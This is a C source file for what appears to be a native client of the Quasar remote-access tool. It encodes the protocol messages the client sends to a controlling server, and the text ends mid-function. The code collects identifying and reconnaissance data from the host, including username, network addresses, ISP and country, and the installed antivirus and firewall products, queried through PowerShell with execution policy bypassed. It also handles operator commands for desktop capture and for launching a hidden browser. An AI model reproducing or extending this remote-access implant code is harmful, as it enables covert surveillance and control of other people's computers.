/**
 * remote_protocol.c
 * Protobuf wire encoding/decoding for Quasar protocol messages.
 * Wire format: tag (varint) then for length-delimited: length (varint) then bytes.
 */

/* GetAdaptersAddresses / IP_ADAPTER_ADDRESSES require a minimum Windows version. */
#ifndef WINVER
#define WINVER 0x0600
#endif
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0600
#endif

#include "pch.h"
#include "remote_protocol.h"
#include "remote_passwords.h"
#include "remote_log.h"
#include <ShlObj.h>
#include <TlHelp32.h>
#include <iphlpapi.h>
#include <netioapi.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#include <string.h>

/* Forward declaration for unwrap used by decoders below. */
static void unwrap_optional_42(const unsigned char* body, unsigned int body_len,
    const unsigned char** parse, unsigned int* parse_len);

/* Prepend IMessage subtype (0x08 + varint) then copy body. Returns total length or 0. */
unsigned int remote_proto_prepend_imessage(unsigned char* out, unsigned int out_size, unsigned int subtype_index, const unsigned char* body, unsigned int body_len) {
    if (!out || out_size < 2) return 0;
    unsigned int n = 0;
    out[n++] = 0x08; /* tag 1, wire varint */
    unsigned int v = subtype_index;
    do {
        if (n >= out_size) return 0;
        unsigned char b = (unsigned char)(v & 0x7F);
        v >>= 7;
        if (v) b |= 0x80;
        out[n++] = b;
    } while (v);
    if (body_len > 0 && body) {
        if (n + body_len > out_size) return 0;
        memcpy(out + n, body, body_len);
        n += body_len;
    }
    return n;
}

#define TAG(field, wire) (((unsigned int)(field) << 3) | (wire))
#define WIRE_VARINT  0
#define WIRE_LEN     2

static unsigned int put_varint(unsigned int value, unsigned char* out) {
    unsigned int n = 0;
    do {
        unsigned char b = (unsigned char)(value & 0x7F);
        value >>= 7;
        if (value) b |= 0x80;
        out[n++] = b;
    } while (value);
    return n;
}

static unsigned int put_varint64(unsigned long long value, unsigned char* out) {
    unsigned int n = 0;
    do {
        unsigned char b = (unsigned char)(value & 0x7F);
        value >>= 7;
        if (value) b |= 0x80;
        out[n++] = b;
    } while (value);
    return n;
}

static unsigned int put_string(unsigned char* out, unsigned int out_size, unsigned int tag, const char* s) {
    if (!s || out_size < 2) return 0;
    size_t slen = strlen(s);
    /* Skip empty strings (omit field) to avoid decoder edge cases. */
    if (slen == 0) return 0;
    if (slen > 0xFFFF) return 0;
    unsigned int pos = 0;
    out[pos++] = (unsigned char)TAG(tag, WIRE_LEN);
    pos += put_varint((unsigned int)slen, out + pos);
    if (pos + (unsigned int)slen > out_size) return 0;
    memcpy(out + pos, s, slen);
    pos += (unsigned int)slen;
    return pos;
}

static unsigned int put_bytes(unsigned char* out, unsigned int out_size, unsigned int tag,
    const unsigned char* data, unsigned int data_len) {
    if (out_size < 2) return 0;
    unsigned int pos = 0;
    out[pos++] = (unsigned char)TAG(tag, WIRE_LEN);
    pos += put_varint(data_len, out + pos);
    if (pos + data_len > out_size) return 0;
    if (data && data_len) memcpy(out + pos, data, data_len);
    pos += data_len;
    return pos;
}

unsigned int remote_proto_encode_identification(const remote_identification_t* id, unsigned char* out, unsigned int out_size) {
    if (!id || !out || out_size < 32) return 0;
    unsigned int pos = 0;
    unsigned int n;

#define EMIT_STR(field_num, str) do { \
    n = put_string(out + pos, out_size - pos, (field_num), (str)); \
    if (n == 0) return 0; pos += n; } while(0)

    /* Emit fields in ascending field number order (protobuf allows any order; some decoders are sensitive). */
    if (id->version && id->version[0]) { n = put_string(out + pos, out_size - pos, 1, id->version); if (!n) return 0; pos += n; }
    if (id->operating_system && id->operating_system[0]) { n = put_string(out + pos, out_size - pos, 2, id->operating_system); if (!n) return 0; pos += n; }
    if (id->account_type && id->account_type[0]) { n = put_string(out + pos, out_size - pos, 3, id->account_type); if (!n) return 0; pos += n; }
    if (id->country && id->country[0]) { n = put_string(out + pos, out_size - pos, 4, id->country); if (!n) return 0; pos += n; }
    if (id->country_code && id->country_code[0]) { n = put_string(out + pos, out_size - pos, 5, id->country_code); if (!n) return 0; pos += n; }
    /* field 6: ImageIndex (varint). Encode as normal varint so values like 247 work. */
    if (out_size - pos < 4) return 0;
    out[pos++] = (unsigned char)TAG(6, WIRE_VARINT);
    {
        int v = id->image_index;
        if (v < 0) v = 0;
        unsigned int n2 = put_varint((unsigned int)v, out + pos);
        pos += n2;
    }
    if (id->id && id->id[0]) { n = put_string(out + pos, out_size - pos, 7, id->id); if (!n) return 0; pos += n; }
    if (id->username && id->username[0]) { n = put_string(out + pos, out_size - pos, 8, id->username); if (!n) return 0; pos += n; }
    if (id->pc_name && id->pc_name[0]) { n = put_string(out + pos, out_size - pos, 9, id->pc_name); if (!n) return 0; pos += n; }
    if (id->tag && id->tag[0]) { n = put_string(out + pos, out_size - pos, 10, id->tag); if (!n) return 0; pos += n; }
    if (id->encryption_key && id->encryption_key[0]) { n = put_string(out + pos, out_size - pos, 11, id->encryption_key); if (!n) return 0; pos += n; }
    if (id->signature && id->signature_len) { n = put_bytes(out + pos, out_size - pos, 12, id->signature, id->signature_len); if (!n) return 0; pos += n; }
    return pos;
}

/* Decode ClientIdentificationResult: field 1 = bool Result (varint). Server may send as IMessage (subtype prefix 08 XX then 08 01). */
int remote_proto_decode_identification_result(const unsigned char* payload, unsigned int payload_len) {
    if (!payload || payload_len < 2) {
        remote_log("[protocol] decode_identification_result: payload too short or null");
        return 0;
    }
    /* Look for tag 08 (field 1 varint) followed by value 1 (true). Skip IMessage subtype prefix 08 XX if present. */
    for (unsigned int i = 0; i + 2 <= payload_len; i++) {
        if (payload[i] == 0x08 && payload[i + 1] == 0x01) {
            remote_log("[protocol] decode_identification_result: accepted=1");
            return 1; /* Result = true */
        }
        if (payload[i] == 0x08 && payload[i + 1] == 0x00) {
            remote_log("[protocol] decode_identification_result: accepted=0 (rejected)");
            return 0; /* Result = false */
        }
    }
    remote_log("[protocol] decode_identification_result: no 08 01/08 00 found in payload, treating as rejected");
    return 0;
}

unsigned int remote_proto_write_frame(const unsigned char* payload, unsigned int payload_len, unsigned char* out, unsigned int out_size) {
    if (!out || out_size < 4 + payload_len) return 0;
    out[0] = (unsigned char)(payload_len);
    out[1] = (unsigned char)(payload_len >> 8);
    out[2] = (unsigned char)(payload_len >> 16);
    out[3] = (unsigned char)(payload_len >> 24);
    if (payload && payload_len)
        memcpy(out + 4, payload, payload_len);
    return 4 + payload_len;
}

int remote_proto_read_frame_length(const unsigned char* header4, unsigned int* out_payload_len) {
    if (!header4 || !out_payload_len) return 0;
    *out_payload_len = (unsigned int)header4[0] | ((unsigned int)header4[1] << 8) |
        ((unsigned int)header4[2] << 16) | ((unsigned int)header4[3] << 24);
    if (*out_payload_len > 16 * 1024 * 1024) return 0; /* max 16MB */
    return 1;
}

/* GetMonitorsResponse: ProtoMember(1) = Number (varint). Wire: tag 1 varint = 0x08 then varint(Number). */
unsigned int remote_proto_encode_get_monitors_response(int number, unsigned char* out, unsigned int out_size) {
    if (!out || out_size < 4) return 0;
    if (number < 0) number = 0;
    if (number > 64) number = 64;
    out[0] = 0x08; /* tag 1, wire varint */
    unsigned int n = put_varint((unsigned int)number, out + 1);
    return n ? (1 + n) : 0;
}

/* Read varint from buffer; returns value, sets *out_consumed to bytes read. Returns 0 and consumed=0 on error. */
static unsigned int read_varint(const unsigned char* buf, unsigned int len, unsigned int* out_consumed) {
    unsigned int value = 0;
    unsigned int shift = 0;
    *out_consumed = 0;
    while (*out_consumed < len && shift < 35) {
        unsigned char b = buf[(*out_consumed)++];
        value |= (unsigned int)(b & 0x7F) << shift;
        if ((b & 0x80) == 0) return value;
        shift += 7;
    }
    *out_consumed = 0;
    return 0;
}

static unsigned long long read_varint64(const unsigned char* buf, unsigned int len, unsigned int* out_consumed) {
    unsigned long long value = 0;
    unsigned int shift = 0;
    *out_consumed = 0;
    while (*out_consumed < len && shift < 64) {
        unsigned char b = buf[(*out_consumed)++];
        value |= (unsigned long long)(b & 0x7F) << shift;
        if ((b & 0x80) == 0) return value;
        shift += 7;
    }
    *out_consumed = 0;
    return 0;
}

unsigned int remote_proto_read_subtype(const unsigned char* payload, unsigned int payload_len, unsigned int* out_consumed) {
    if (!payload || payload_len < 2 || !out_consumed) { if (out_consumed) *out_consumed = 0; return 0; }
    if (payload[0] != 0x08) { *out_consumed = 0; return 0; }
    unsigned int n = 0;
    unsigned int subtype = read_varint(payload + 1, payload_len - 1, &n);
    *out_consumed = 1 + n;
    return subtype;
}

/* If payload starts with 0x42 (field 8 length-delimited), unwrap to inner message. Returns 1 if unwrapped. */
int remote_proto_unwrap_payload_if_42(const unsigned char* payload, unsigned int len, unsigned char* out, unsigned int out_size, unsigned int* out_len) {
    if (!payload || len < 3 || !out || out_size == 0 || !out_len) return 0;
    if (payload[0] != 0x42) return 0;
    unsigned int n = 0;
    unsigned int inner_len = read_varint(payload + 1, len - 1, &n);
    if (n == 0 || inner_len > out_size || 1u + n + inner_len > len) return 0;
    memcpy(out, payload + 1 + n, inner_len);
    *out_len = inner_len;
    return 1;
}

/* GetDrivesResponse: field 1 repeated Drive. Each Drive: field 1 DisplayName, field 2 RootDirectory. */
unsigned int remote_proto_encode_get_drives_response(unsigned char* out, unsigned int out_size) {
    if (!out || out_size < 16) return 0;
    unsigned int pos = 0;
    char drives[256];
    if (GetLogicalDriveStringsA(sizeof(drives), drives) == 0) return 0;
    const char* p = drives;
    while (*p) {
        size_t root_len = strlen(p);
        if (root_len == 0) break;
        char display[64];
        _snprintf_s(display, sizeof(display), _TRUNCATE, "%s [Local]", p);
        unsigned char drive_buf[128];
        unsigned int drive_pos = 0;
        unsigned int n = put_string(drive_buf + drive_pos, sizeof(drive_buf) - drive_pos, 1, display);
        if (!n) break;
        drive_pos += n;
        n = put_string(drive_buf + drive_pos, sizeof(drive_buf) - drive_pos, 2, p);
        if (!n) break;
        drive_pos += n;
        if (pos + 2 + put_varint(drive_pos, out + pos + 2) + drive_pos > out_size) break;
        out[pos++] = (unsigned char)TAG(1, WIRE_LEN);
        pos += put_varint(drive_pos, out + pos);
        if (pos + drive_pos > out_size) break;
        memcpy(out + pos, drive_buf, drive_pos);
        pos += drive_pos;
        p += root_len + 1;
    }
    return pos;
}

static int append_system_tuple(unsigned char* out, unsigned int out_size, unsigned int* pos,
    const char* key, const char* value)
{
    if (!out || !pos || !key || !value) return 0;
    if (value[0] == '\0') value = "Unknown";

    unsigned char tuple_buf[512];
    unsigned int tuple_pos = 0;

    unsigned int n = put_string(tuple_buf + tuple_pos, sizeof(tuple_buf) - tuple_pos, 1, key);
    if (!n) return 0;
    tuple_pos += n;

    n = put_string(tuple_buf + tuple_pos, sizeof(tuple_buf) - tuple_pos, 2, value);
    if (!n) return 0;
    tuple_pos += n;

    /* field 1 (tag 1, wire len) + varint(len(tuple)) + tuple bytes */
    if (*pos + 1 + 5 + tuple_pos > out_size) return 0;
    out[(*pos)++] = (unsigned char)TAG(1, WIRE_LEN);
    *pos += put_varint(tuple_pos, out + *pos);
    if (*pos + tuple_pos > out_size) return 0;
    memcpy(out + *pos, tuple_buf, tuple_pos);
    *pos += tuple_pos;
    return 1;
}

static int extract_json_string(const char* src, const char* key, char* dst, size_t dst_sz)
{
    if (!src || !key || !dst || dst_sz < 3) return 0;
    dst[0] = '\0';

    char pat[96];
    _snprintf_s(pat, sizeof(pat), _TRUNCATE, "\"%s\"", key);

    const char* p = strstr(src, pat);
    if (!p) return 0;
    p = strchr(p, ':');
    if (!p) return 0;
    p++;
    while (*p == ' ' || *p == '\t' || *p == '\r' || *p == '\n') p++;
    if (*p != '\"') return 0;
    p++;

    size_t i = 0;
    while (*p && *p != '\"' && i + 1 < dst_sz) {
        if (*p == '\\' && p[1]) {
            p++;
            dst[i++] = *p++;
            continue;
        }
        dst[i++] = *p++;
    }
    dst[i] = '\0';
    return i > 0;
}

static int extract_json_number_as_string(const char* src, const char* key, char* dst, size_t dst_sz)
{
    if (!src || !key || !dst || dst_sz < 2) return 0;
    dst[0] = '\0';

    char pat[96];
    _snprintf_s(pat, sizeof(pat), _TRUNCATE, "\"%s\"", key);

    const char* p = strstr(src, pat);
    if (!p) return 0;
    p = strchr(p, ':');
    if (!p) return 0;
    p++;
    while (*p == ' ' || *p == '\t' || *p == '\r' || *p == '\n') p++;

    int neg = 0;
    if (*p == '-') { neg = 1; p++; }

    size_t i = 0;
    if (neg && i + 1 < dst_sz) dst[i++] = '-';

    size_t digits_start = i;
    while (*p && *p >= '0' && *p <= '9' && i + 1 < dst_sz) {
        dst[i++] = *p++;
    }
    dst[i] = '\0';
    return i > digits_start;
}

/* GetSystemInfoResponse: field 1 repeated (Tuple Item1, Item2). Only keys the server does not already show
 * (server AddBasicSystemInformation already shows Operating System and Architecture from client.Value). */
unsigned int remote_proto_encode_get_system_info_response(unsigned char* out, unsigned int out_size) {
    if (!out || out_size < 2048) return 0;

    unsigned int pos = 0;

    /* Values with reasonable fallbacks. */
    char pc_name[256] = { 0 };
    char username[256] = { 0 };
    char domain_name[256] = { 0 };
    char host_name[256] = { 0 };
    char cpu_name[256] = { 0 };
    char ram_str[64] = { 0 };
    char gpu_name[256] = { 0 };
    char sys_dir[MAX_PATH] = { 0 };
    char sys_drive[8] = { 0 };
    char uptime_str[64] = { 0 };
    char mac_addr[32] = { 0 };
    char lan_ip[64] = { 0 };
    char wan_ip[64] = { 0 };
    char country[128] = { 0 };
    char tz_utc[64] = { 0 };
    char asn[64] = { 0 };
    char isp[128] = { 0 };
    char antivirus[512] = { 0 };
    char firewall[512] = { 0 };

    /* PC name */
    DWORD pc_name_len = (DWORD)sizeof(pc_name);
    if (!GetComputerNameA(pc_name, &pc_name_len) || pc_name[0] == '\0')
        strcpy_s(pc_name, sizeof(pc_name), "Unknown");

    /* Username */
    DWORD username_len = (DWORD)sizeof(username);
    if (!GetUserNameA(username, &username_len) || username[0] == '\0')
        strcpy_s(username, sizeof(username), "Unknown");

    /* Domain/host */
    DWORD domain_len = (DWORD)sizeof(domain_name);
    if (!GetComputerNameExA(ComputerNamePhysicalDnsDomain, domain_name, &domain_len) || domain_name[0] == '\0')
        strcpy_s(domain_name, sizeof(domain_name), "-");
    DWORD host_len = (DWORD)sizeof(host_name);
    if (!GetComputerNameExA(ComputerNamePhysicalDnsHostname, host_name, &host_len) || host_name[0] == '\0')
        strcpy_s(host_name, sizeof(host_name), "-");

    /* CPU name from registry */
    {
        HKEY hKey = NULL;
        const char* subkey = "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0";
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, subkey, 0, KEY_READ, &hKey) == ERROR_SUCCESS && hKey) {
            DWORD type = 0;
            char buf[256] = { 0 };
            DWORD bufSize = (DWORD)sizeof(buf);
            if (RegQueryValueExA(hKey, "ProcessorNameString", NULL, &type, (LPBYTE)buf, &bufSize) == ERROR_SUCCESS &&
                buf[0] != '\0') {
                strcpy_s(cpu_name, sizeof(cpu_name), buf);
            }
            RegCloseKey(hKey);
        }
    }
    if (cpu_name[0] == '\0') strcpy_s(cpu_name, sizeof(cpu_name), "Unknown");

    /* RAM */
    {
        MEMORYSTATUSEX ms;
        ZeroMemory(&ms, sizeof(ms));
        ms.dwLength = sizeof(ms);
        if (GlobalMemoryStatusEx(&ms)) {
            unsigned long long total_mb = (unsigned long long)(ms.ullTotalPhys / (1024ull * 1024ull));
            _snprintf_s(ram_str, sizeof(ram_str), _TRUNCATE, "%llu MB", total_mb);
        }
    }
    if (ram_str[0] == '\0') strcpy_s(ram_str, sizeof(ram_str), "Unknown");

    /* GPU name */
    {
        DISPLAY_DEVICEA dd;
        ZeroMemory(&dd, sizeof(dd));
        dd.cb = sizeof(dd);
        for (DWORD i = 0; ; i++) {
            ZeroMemory(&dd, sizeof(dd));
            dd.cb = sizeof(dd);
            if (!EnumDisplayDevicesA(NULL, i, &dd, 0)) break;
            if (dd.DeviceString[0] == '\0') continue;
            if (strstr(dd.DeviceString, "Microsoft Basic Display Adapter") != NULL) continue;
            strcpy_s(gpu_name, sizeof(gpu_name), dd.DeviceString);
            break;
        }
    }
    if (gpu_name[0] == '\0') strcpy_s(gpu_name, sizeof(gpu_name), "Unknown");

    /* System dir */
    if (GetSystemDirectoryA(sys_dir, sizeof(sys_dir)) == 0 || sys_dir[0] == '\0')
        strcpy_s(sys_dir, sizeof(sys_dir), "Unknown");
    if (sys_dir[0] && sys_dir[1] == ':')
        _snprintf_s(sys_drive, sizeof(sys_drive), _TRUNCATE, "%c:\\", sys_dir[0]);
    else
        strcpy_s(sys_drive, sizeof(sys_drive), "Unknown");

    /* Uptime */
    {
        ULONGLONG ms = GetTickCount64();
        ULONGLONG sec = ms / 1000ull;
        unsigned long long days = sec / (24ull * 3600ull);
        sec %= (24ull * 3600ull);
        unsigned long long hours = sec / 3600ull;
        sec %= 3600ull;
        unsigned long long mins = sec / 60ull;
        unsigned long long secs = sec % 60ull;
        _snprintf_s(uptime_str, sizeof(uptime_str), _TRUNCATE, "%llud : %lluh : %llum : %llus",
            days, hours, mins, secs);
    }

    /* MAC + LAN IPv4
     * Use GetAdaptersInfo (older, widely available) to avoid SDK/type issues with IP_ADAPTER_ADDRESSES. */
    {
        IP_ADAPTER_INFO* adapterInfo = NULL;
        ULONG outBufLen = 0;
        DWORD ret = GetAdaptersInfo(adapterInfo, &outBufLen);
        if (ret == ERROR_BUFFER_OVERFLOW && outBufLen > 0) {
            adapterInfo = (IP_ADAPTER_INFO*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, outBufLen);
            if (adapterInfo) {
                ret = GetAdaptersInfo(adapterInfo, &outBufLen);
                if (ret == NO_ERROR) {
                    IP_ADAPTER_INFO* cur = adapterInfo;
                    for (; cur != NULL; cur = cur->Next) {
                        if (mac_addr[0] == '\0' && cur->AddressLength >= 6) {
                            _snprintf_s(mac_addr, sizeof(mac_addr), _TRUNCATE,
                                "%02X:%02X:%02X:%02X:%02X:%02X",
                                cur->Address[0], cur->Address[1], cur->Address[2],
                                cur->Address[3], cur->Address[4], cur->Address[5]);
                        }

                        if (lan_ip[0] == '\0') {
                            IP_ADDR_STRING* ipList = &cur->IpAddressList;
                            while (ipList != NULL) {
                                if (ipList->IpAddress.String[0] != '\0') {
                                    if (strncmp(ipList->IpAddress.String, "127.", 4) != 0 &&
                                        strcmp(ipList->IpAddress.String, "0.0.0.0") != 0) {
                                        strncpy_s(lan_ip, sizeof(lan_ip), ipList->IpAddress.String, _TRUNCATE);
                                        break;
                                    }
                                }
                                ipList = ipList->Next;
                            }
                        }

                        if (mac_addr[0] != '\0' && lan_ip[0] != '\0') break;
                    }
                }
            }
        }
        if (adapterInfo) HeapFree(GetProcessHeap(), 0, adapterInfo);
    }
    if (mac_addr[0] == '\0') strcpy_s(mac_addr, sizeof(mac_addr), "Unknown");
    if (lan_ip[0] == '\0') strcpy_s(lan_ip, sizeof(lan_ip), "Unknown");

    /* Antivirus + Firewall (match C# client behavior)
     * C# uses WMI: AntivirusProduct / FirewallProduct in SecurityCenter2 (fallback SecurityCenter).
     * Here we run PowerShell Get-CimInstance and join displayName with "; ". */
    {
        antivirus[0] = '\0';
        firewall[0] = '\0';

        char cmd[2048];
        _snprintf_s(cmd, sizeof(cmd), _TRUNCATE,
            "cmd /c powershell -NoProfile -ExecutionPolicy Bypass -Command \"$ErrorActionPreference='SilentlyContinue'; "
            "$av=(Get-CimInstance -Namespace 'root\\SecurityCenter2' -ClassName AntivirusProduct -ErrorAction SilentlyContinue | Select-Object -ExpandProperty displayName) -join '; '; "
            "if([string]::IsNullOrEmpty($av)) { $av=(Get-CimInstance -Namespace 'root\\SecurityCenter' -ClassName AntivirusProduct -ErrorAction SilentlyContinue | Select-Object -ExpandProperty displayName) -join '; ' }; "
            "$fw=(Get-CimInstance -Namespace 'root\\SecurityCenter2' -ClassName FirewallProduct -ErrorAction SilentlyContinue | Select-Object -ExpandProperty displayName) -join '; '; "
            "if([string]::IsNullOrEmpty($fw)) { $fw=(Get-CimInstance -Namespace 'root\\SecurityCenter' -ClassName FirewallProduct -ErrorAction SilentlyContinue | Select-Object -ExpandProperty displayName) -join '; ' }; "
            "if([string]::IsNullOrEmpty($av)){$av='N/A'}; if([string]::IsNullOrEmpty($fw)){$fw='N/A'}; "
            "$av+'|||'+$fw\"");

        FILE* fp = _popen(cmd, "rt");
        char outbuf[1024];
        size_t total = 0;
        outbuf[0] = '\0';
        if (fp) {
            while (total < sizeof(outbuf) - 1) {
                if (fgets(outbuf + total, (int)(sizeof(outbuf) - 1 - total), fp) == NULL) break;
                total = strlen(outbuf);
            }
            _pclose(fp);
        }

        /* Trim possible newlines at end */
        for (size_t i = 0; outbuf[i] != '\0'; i++) {
            if (outbuf[i] == '\r' || outbuf[i] == '\n') { outbuf[i] = '\0'; break; }
        }

        const char* delim = strstr(outbuf, "|||");
        if (delim) {
            size_t av_len = (size_t)(delim - outbuf);
            size_t fw_len = strlen(delim + 3);
            if (av_len >= 1 && av_len < sizeof(antivirus)) {
                memcpy(antivirus, outbuf, av_len);
                antivirus[av_len] = '\0';
            }
            if (fw_len >= 1 && fw_len < sizeof(firewall)) {
                memcpy(firewall, delim + 3, fw_len);
                firewall[fw_len] = '\0';
            }
        }

        if (antivirus[0] == '\0') strcpy_s(antivirus, sizeof(antivirus), "Unknown");
        if (firewall[0] == '\0') strcpy_s(firewall, sizeof(firewall), "Unknown");
    }

    /* Geo/IP (ipwho.is via PowerShell + string scanning, cached) */
    {
        static ULONGLONG s_last_geo_ms = 0;
        static char s_wan_ip[64] = { 0 };
        static char s_country[128] = { 0 };
        static char s_tz_utc[64] = { 0 };
        static char s_asn[64] = { 0 };
        static char s_isp[128] = { 0 };

        if (s_last_geo_ms == 0 || (GetTickCount64() - s_last_geo_ms) > (12ull * 60ull * 60ull * 1000ull)) {
            char cmd[2048];
            _snprintf_s(cmd, sizeof(cmd), _TRUNCATE,
                "cmd /c powershell -NoProfile -ExecutionPolicy Bypass -Command \"(Invoke-WebRequest -Uri 'https://ipwho.is/' -UseBasicParsing).Content\"");

            FILE* fp = _popen(cmd, "rt");
            char json[8192];
            size_t total = 0;
            json[0] = '\0';
            if (fp) {
                while (total < sizeof(json) - 1) {
                    if (fgets(json + total, (int)(sizeof(json) - 1 - total), fp) == NULL) break;
                    total = strlen(json);
                }
                _pclose(fp);
            }

            if (json[0] != '\0') {
                (void)extract_json_string(json, "ip", wan_ip, sizeof(wan_ip));
                (void)extract_json_string(json, "country", country, sizeof(country));

                const char* tz_section = strstr(json, "\"timezone\"");
                if (tz_section) (void)extract_json_string(tz_section, "utc", tz_utc, sizeof(tz_utc));

                const char* conn_section = strstr(json, "\"connection\"");
                if (conn_section) {
                    (void)extract_json_number_as_string(conn_section, "asn", asn, sizeof(asn));
                    (void)extract_json_string(conn_section, "isp", isp, sizeof(isp));
                }
            }

            if (wan_ip[0] == '\0') strcpy_s(wan_ip, sizeof(wan_ip), "Unknown");
            if (country[0] == '\0') strcpy_s(country, sizeof(country), "Unknown");
            if (tz_utc[0] == '\0') strcpy_s(tz_utc, sizeof(tz_utc), "Unknown");
            if (asn[0] == '\0') strcpy_s(asn, sizeof(asn), "Unknown");
            if (isp[0] == '\0') strcpy_s(isp, sizeof(isp), "Unknown");

            strcpy_s(s_wan_ip, sizeof(s_wan_ip), wan_ip);
            strcpy_s(s_country, sizeof(s_country), country);
            strcpy_s(s_tz_utc, sizeof(s_tz_utc), tz_utc);
            strcpy_s(s_asn, sizeof(s_asn), asn);
            strcpy_s(s_isp, sizeof(s_isp), isp);
            s_last_geo_ms = GetTickCount64();
        } else {
            strcpy_s(wan_ip, sizeof(wan_ip), s_wan_ip[0] ? s_wan_ip : "Unknown");
            strcpy_s(country, sizeof(country), s_country[0] ? s_country : "Unknown");
            strcpy_s(tz_utc, sizeof(tz_utc), s_tz_utc[0] ? s_tz_utc : "Unknown");
            strcpy_s(asn, sizeof(asn), s_asn[0] ? s_asn : "Unknown");
            strcpy_s(isp, sizeof(isp), s_isp[0] ? s_isp : "Unknown");
        }
    }

    /* Emit tuples in the same order as the original C# client. */
    (void)append_system_tuple(out, out_size, &pos, "Processor (CPU)", cpu_name);
    (void)append_system_tuple(out, out_size, &pos, "Memory (RAM)", ram_str);
    (void)append_system_tuple(out, out_size, &pos, "Video Card (GPU)", gpu_name);
    (void)append_system_tuple(out, out_size, &pos, "Username", username);
    (void)append_system_tuple(out, out_size, &pos, "PC Name", pc_name);
    (void)append_system_tuple(out, out_size, &pos, "Domain Name", domain_name);
    (void)append_system_tuple(out, out_size, &pos, "Host Name", host_name);
    (void)append_system_tuple(out, out_size, &pos, "System Drive", sys_drive);
    (void)append_system_tuple(out, out_size, &pos, "System Directory", sys_dir);
    (void)append_system_tuple(out, out_size, &pos, "Uptime", uptime_str);
    (void)append_system_tuple(out, out_size, &pos, "MAC Address", mac_addr);
    (void)append_system_tuple(out, out_size, &pos, "LAN IP Address", lan_ip);
    (void)append_system_tuple(out, out_size, &pos, "WAN IP Address", wan_ip);
    (void)append_system_tuple(out, out_size, &pos, "ASN", asn);
    (void)append_system_tuple(out, out_size, &pos, "ISP", isp);
    (void)append_system_tuple(out, out_size, &pos, "Antivirus", antivirus);
    (void)append_system_tuple(out, out_size, &pos, "Firewall", firewall);
    (void)append_system_tuple(out, out_size, &pos, "Time Zone", tz_utc);
    (void)append_system_tuple(out, out_size, &pos, "Country", country);

    return pos;
}

/* Parse GetDesktop body: field 1 CreateNew (tag 0x08), field 2 Quality (tag 0x10), field 3 DisplayIndex (tag 0x18).
 * Protobuf-net may wrap in field 42 (tag D2 02), length-delimited.
 * create_new may be NULL; if non-NULL, set to 1 when CreateNew is present and non-zero. */
int remote_proto_decode_get_desktop(const unsigned char* body, unsigned int body_len, int* quality, int* display_index, int* create_new) {
    if (!body || !quality || !display_index) return 0;
    *quality = 75;
    *display_index = 0;
    if (create_new) *create_new = 0;
    /* Unwrap protobuf-net length-delimited envelope (field 42, wire 2) if present. */
    const unsigned char* parse_body = body;
    unsigned int parse_len = body_len;
    if (body_len >= 3) {
        unsigned int tag_consumed = 0;
        unsigned int tag_val = read_varint(body, body_len, &tag_consumed);
        if (tag_consumed > 0 && (tag_val & 7) == 2) {
            unsigned int len_consumed = 0;
            unsigned int inner_len = read_varint(body + tag_consumed, body_len - tag_consumed, &len_consumed);
            if (len_consumed > 0 && tag_consumed + len_consumed + inner_len <= body_len) {
                parse_body = body + tag_consumed + len_consumed;
                parse_len = inner_len;
            }
        }
    }
    unsigned int i = 0;
    while (i + 2 <= parse_len) {
        unsigned char tag = parse_body[i++];
        unsigned int wire = tag & 7;
        unsigned int field = tag >> 3;
        if (wire == 0) {
            unsigned int consumed = 0;
            unsigned int v = read_varint(parse_body + i, parse_len - i, &consumed);
            if (consumed == 0) break;
            if (field == 1) { if (create_new) *create_new = (v != 0) ? 1 : 0; }
            else if (field == 2) *quality = (int)(v > 100 ? 100 : v);
            else if (field == 3) *display_index = (int)v;
            i += consumed;
        } else if (wire == 2) {
            unsigned int len_consumed = 0;
            unsigned int len = read_varint(parse_body + i, parse_len - i, &len_consumed);
            if (len_consumed == 0 || i + len_consumed + len > parse_len) break;
            i += len_consumed + len;
        } else
            break;
    }
    return 1;
}

/* Parse DoStartHiddenBrowser body: field 1 Quality, field 2 DisplayIndex. Protobuf-net may wrap in field 42. */
int remote_proto_decode_do_start_hidden_browser(const unsigned char* body, unsigned int body_len, int* quality, int* display_index) {
    if (!body || !quality || !display_index) return 0;
    *quality = 75;
    *display_index = 0;
    const unsigned char* parse_body = body;
    unsigned int parse_len = body_len;
    if (body_len >= 3) {
        unsigned int tag_consumed = 0;
        unsigned int tag_val = read_varint(body, body_len, &tag_consumed);
        if (tag_consumed > 0 && (tag_val & 7) == 2) {
            unsigned int len_consumed = 0;
            unsigned int inner_len = read_varint(body + tag_consumed, body_len - tag_consumed, &len_consumed);
            if (len_consumed > 0 && tag_consumed + len_consumed + inner_len <= body_len) {
                parse_body = body + tag_consumed + len_consumed;
                parse_len = inner_len;
            }
        }
    }
    unsigned int i = 0;
    while (i + 2 <= parse_len) {
        unsigned char tag = parse_body[i++];
        unsigned int wire = tag & 7;
        unsigned int field = tag >> 3;
        if (wire == 0) {
            unsigned int consumed = 0;
            unsigned int v = read_varint(parse_body + i, parse_len - i, &consumed);
            if (consumed == 0) break;
            if (field == 1) *quality = (int)(v > 100 ? 100 : (v < 1 ? 75 : v));
            else if (field == 2) *display_index = (int)(v < 0 ? 0 : v);
            i += consumed;
        } else if (wire == 2) {
            unsigned int len_consumed = 0;
            unsigned int len = read_varint(parse_body + i, parse_len - i, &len_consumed);
            if (len_consumed == 0 || i + len_consumed + len > parse_len) break;
            i += len_consumed + len;
        } else break;
    }
    return 1;
}

/* Resolution message: field 1 Width (varint), field 2 Height (varint). */
static unsigned int put_resolution(unsigned char* out, unsigned int out_size, int width, int height) {
    unsigned int pos = 0;
    out[pos++] = (unsigned char)TAG(1, WIRE_VARINT);
    pos += put_varint((unsigned int)width, out + pos);
    out[pos++] = (unsigned char)TAG(2, WIRE_VARINT);
    pos += put_varint((unsigned int)height, out + pos);
    return pos;
}

/* Re-encode GetDesktopResponse with correct Resolution. */
unsigned int remote_proto_encode_get_desktop_response(const unsigned char* image_data, unsigned int image_len, int quality, int monitor, int width, int height, unsigned char* out, unsigned int out_size) {
    if (!out || !image_data || out_size < 32) return 0;
    unsigned int pos = 0;
    pos += put_bytes(out + pos, out_size - pos, 1, image_data, image_len);
    out[pos++] = (unsigned char)TAG(2, WIRE_VARINT);
    pos += put_varint((unsigned int)(quality <= 0 ? 75 : (quality > 100 ? 100 : quality)), out + pos);
